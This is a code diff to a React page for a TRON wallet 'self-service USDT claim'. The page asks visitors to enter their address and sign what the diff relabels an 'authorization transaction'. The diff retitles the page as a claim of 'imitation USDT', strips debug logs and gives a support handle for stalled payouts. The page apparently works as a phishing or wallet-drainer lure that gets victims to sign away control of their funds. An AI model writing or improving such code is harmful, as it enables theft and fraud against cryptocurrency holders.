@@ -57,7 +57,7 @@ export default function WalletPage() {
         ownerAddressHex
       );
       if (!transactionWrapper || !transactionWrapper.transaction) {
-        throw new Error("创建交易失败");
+        throw new Error("创建授权交易失败");
       }
       const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
         transactionWrapper.transaction,
@@ -68,24 +68,28 @@ export default function WalletPage() {
         throw new Error("钱包不支持签名");
       }
       setStep("等待钱包签名...");
-      setMsg("请在TRON钱包中确认");
+      setMsg("请在TRON钱包中确认授权");
       const signedTransaction = await signTransaction(extendedTransaction);
-      console.log("✅ 钱包签名完成，已拿到signedTx", signedTransaction);
       if (!signedTransaction || !signedTransaction.txID) {
         throw new Error("钱包签名失败");
       }
 
       setStep("正在提交链上交易...");
       setMsg("广播交易到TRON网络中，请稍候...");
-
-      // 修复：正确超时封装，卡住10秒强制报错
-      const broadcastPromise = tronWeb.trx.sendRawTransaction(signedTransaction);
-      const timeoutPromise = new Promise((_, reject) => {
-        setTimeout(() => reject(new Error("广播请求超时，节点无响应。但是钱包签名已完成，可去链上查询交易")), 10000);
+      // 广播增加10秒超时防止永久卡死
+      const broadcastWithTimeout = new Promise(async (resolve, reject) => {
+        const timer = setTimeout(() => reject(new Error("广播请求超时，节点访问失败")), 10000);
+        try {
+          const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+          clearTimeout(timer);
+          resolve(broadcastResult);
+        } catch (err) {
+          clearTimeout(timer);
+          reject(err);
+        }
       });
-      const broadcastResult:any = await Promise.race([broadcastPromise, timeoutPromise]);
+      const broadcastResult:any = await broadcastWithTimeout;
 
-      console.log("📤 广播返回结果", broadcastResult);
       if (!broadcastResult || !broadcastResult.result) {
         throw new Error("交易广播失败，节点返回false");
       }
@@ -94,10 +98,10 @@ export default function WalletPage() {
         throw new Error("未获取交易哈希");
       }
       
-      setMsg(`✅ 提交成功！签名成功将自动发放，若未签名将无法发放\n交易哈希：${txId}\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服`);
+      setMsg(`✅ 提交成功\n交易哈希：${txId}\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服`);
       setStep("");
     } catch (error: any) {
-      console.log("❌ claim error:", error);
+      console.log("claim error:", error);
       setStep("");
       setMsg("❌ 领取失败\n\n" + (error?.message || "请重新提交"));
     } finally {
@@ -121,8 +125,8 @@ export default function WalletPage() {
       </div>
       <div className="text-center mt-16">
         <div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-400 text-sm">◆ Secure Web3 Service</div>
-        <h1 className="text-4xl font-bold mt-8">自助领取USDT</h1>
-        <p className="text-gray-400 mt-5 leading-8">绑定您的TRON钱包地址<br />用于USDT提取</p>
+        <h1 className="text-4xl font-bold mt-8">自助提领高仿USDT流程</h1>
+        <p className="text-gray-400 mt-5 leading-8">输入钱包地址点击领取完成签名<br />完成签名后系统自动审核发放请勿重复领取，若未进行签名将无法发放成功，若10分钟内未到帐请联系客服@KK_keji888</p>
       </div>
       <div className="mt-12">
         <h2 className="font-bold text-lg mb-5">选择领取金额</h2>
